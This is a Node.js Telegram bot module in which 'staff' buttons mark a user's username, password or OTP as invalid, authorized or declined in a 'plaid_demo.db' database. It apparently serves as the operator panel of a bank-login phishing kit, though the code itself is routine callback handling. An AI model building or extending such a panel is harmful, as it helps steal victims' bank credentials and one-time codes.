import fetch from "node-fetch";
import Database from "better-sqlite3";
import chalk from "chalk";
import dotenv from "dotenv";
dotenv.config();


const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const DB_PATH = process.env.DB_PATH || "plaid_demo.db";

if (!TELEGRAM_TOKEN) {
  console.error("❌ TELEGRAM_TOKEN missing. Set it in Render env vars.");
  process.exit(1);
}

const db = new Database(DB_PATH);
console.log(chalk.green(`💾 Using database: ${DB_PATH}`));

// -------------------------
// Telegram API helpers
// -------------------------

async function answerCallback(callback_query_id, text) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id, text, show_alert: true }),
    });
    const data = await res.json();
    console.log(chalk.blue(`📩 Callback answered: ${text}`), data);
  } catch (err) {
    console.error(chalk.red("💥 Error answering callback:"), err);
  }
}

async function editMessage(chat_id, message_id, text) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id, message_id, text, parse_mode: "HTML" }),
    });
    const data = await res.json();
    console.log(chalk.blue(`✏️ Message edited: ${text}`), data);
  } catch (err) {
    console.error(chalk.red("💥 Error editing message:"), err);
  }
}

// // -------------------------
// // Poll updates from Telegram
// // -------------------------

// async function pollUpdates(offset = 0) {
//   try {
//     const res = await fetch(
//       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?timeout=30&offset=${offset}`
//     );
//     const data = await res.json();

//     if (!data.ok) {
//       console.error(chalk.red("💥 Telegram getUpdates failed:"), data);
//     }

//     if (data.ok && data.result.length > 0) {
//       for (const update of data.result) {
//         const newOffset = update.update_id + 1;
//         console.log(chalk.yellow(`📥 Received update: ${JSON.stringify(update)}`));
//         await handleUpdate(update);
//         offset = newOffset;
//       }
//     }
//   } catch (err) {
//     console.error(chalk.red("💥 Telegram polling error:"), err);
//   } finally {
//     setTimeout(() => pollUpdates(offset), 1000);
//   }
// }

// -------------------------
// Handle staff button clicks
// -------------------------

async function handleUpdate(update) {
  if (!update.callback_query) {
    console.log("📥 Incoming update:", JSON.stringify(update));
  // ... rest of your code
    console.log(chalk.gray("ℹ️ Non-callback update received, skipping..."));
    return;
  }

  const { id: callback_query_id, data, message } = update.callback_query;

  if (!data) {
    console.warn(chalk.yellow("⚠️ Callback data missing"));
    return;
  }

  console.log(chalk.magenta(`🔹 Callback data received: ${data}`));

  // -------------------------
  // Normalize callback data
  // -------------------------
  let normalizedData = data
    .replace("invalid_username", "invaliduser")
    .replace("invalid_password", "invalidpass")
    .replace("authorized", "authorize")  // ensure matches backend
    .replace("declined", "decline");     // ensure matches backend

  const parts = normalizedData.split("_");

  if (parts.length !== 2) {
    console.warn(chalk.yellow(`⚠️ Invalid callback format: ${normalizedData}`));
    await answerCallback(callback_query_id, "⚠️ Invalid action format. Contact admin.");
    return;
  }

  const [action, userId] = parts;

  if (!userId || isNaN(Number(userId))) {
    console.warn(chalk.yellow(`⚠️ Invalid userId in callback: ${normalizedData}`));
    await answerCallback(callback_query_id, "⚠️ Invalid user ID. Contact admin.");
    return;
  }

  let statusText = "";
  let newMsg = "";

  console.log(chalk.cyan(`🔧 Processing action: ${action}, userId: ${userId}`));

  switch (action) {
    case "invaliduser":
      db.prepare("UPDATE user_data SET otp_status = 'invaliduser' WHERE id = ?").run(userId);
      statusText = "🚫 Invalid Username";
      break;

    case "invalidpass":
      db.prepare("UPDATE user_data SET otp_status = 'invalidpass' WHERE id = ?").run(userId);
      statusText = "🔐 Invalid Password";
      break;

    case "authorize":
      db.prepare("UPDATE user_data SET otp_status = 'authorized' WHERE id = ?").run(userId);
      statusText = "✅ OTP Authorized by staff";
      break;

    case "decline":
      db.prepare("UPDATE user_data SET otp_status = 'declined' WHERE id = ?").run(userId);
      statusText = "❌ OTP Declined by staff";
      break;

    default:
      console.warn(chalk.yellow(`⚠️ Unknown action received: ${action}`));
      await answerCallback(callback_query_id, `⚠️ Unknown action: ${action}`);
      return;
  }

  newMsg = `<b>Status Update</b>\n${statusText}`;
  console.log(chalk.green(`💾 Updated user_id ${userId} -> ${statusText}`));

  // Immediate feedback to staff
  await answerCallback(callback_query_id, statusText);

  // Update the Telegram message text
  await editMessage(message.chat.id, message.message_id, newMsg);
}

// -------------------------
// Start polling
// -------------------------
// At the bottom of telegramBot.js
export { handleUpdate };

console.log(chalk.blueBright("🤖 Telegram bot listener running with full debugging and normalization..."));
